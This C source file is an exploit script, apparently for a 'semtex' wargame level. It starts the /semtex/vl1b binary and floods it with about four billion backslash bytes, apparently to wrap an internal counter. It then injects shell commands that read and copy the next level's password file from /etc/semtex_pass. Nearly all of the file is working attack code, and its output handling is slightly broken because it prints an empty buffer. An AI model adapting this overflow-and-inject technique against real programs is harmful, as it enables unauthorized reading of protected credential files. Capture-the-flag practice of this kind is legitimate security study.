#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define READ 0
#define WRITE 1
pid_t
popen2(const char *command, int *infp, int *outfp)
{
    int p_stdin[2], p_stdout[2];
    pid_t pid;

    if (pipe(p_stdin) != 0 || pipe(p_stdout) != 0)
        return -1;

    pid = fork();

    if (pid < 0)
        return pid;
    else if (pid == 0)
    {
        close(p_stdin[WRITE]);
        dup2(p_stdin[READ], READ);
        close(p_stdout[READ]);
        dup2(p_stdout[WRITE], WRITE);

        execl("/bin/sh", "sh", "-c", command, NULL);
        perror("execl");
        exit(1);
    }

    if (infp == NULL)
        close(p_stdin[WRITE]);
    else
        *infp = p_stdin[WRITE];

    if (outfp == NULL)
        close(p_stdout[READ]);
    else
        *outfp = p_stdout[READ];
    return pid;
}



int main(int argc, char** argv) {
  int in,out;
  unsigned long i=0;
  unsigned int target=0xF4FFFFFE;
  const unsigned int inc=0xFFFF;
  char buf[inc+1];
  const char* pl="cat /etc/semtex_pass/semtex12 > /tmp/semtex12;\ncat /etc/semtex_pass/semtex12\n\0";
  char buf2[512];
  memset(buf2,'\0',512);

  if(popen2("/semtex/vl1b", &in, &out) <= 0) {
    printf("Failed to open vl1b.\n");
    exit(1);
  }
  memset(buf,'\\',inc);
  buf[inc]=0x00;
  printf("Done setting up buf. Starting attack.\n");
  for(i=0;i<target;i+=inc) {
    write(in,buf,inc);
  }
  write(in,"a\n",2);
  printf("Attack complete. Sending payload.\n");
  write(in,pl,strlen(pl));
  printf("Payload sent, awaiting reply.\n");
  read(out,buf,512);
  printf("Done. Buf: %s\n",buf2);
  close(in);
  close(out);
  return 0;
}
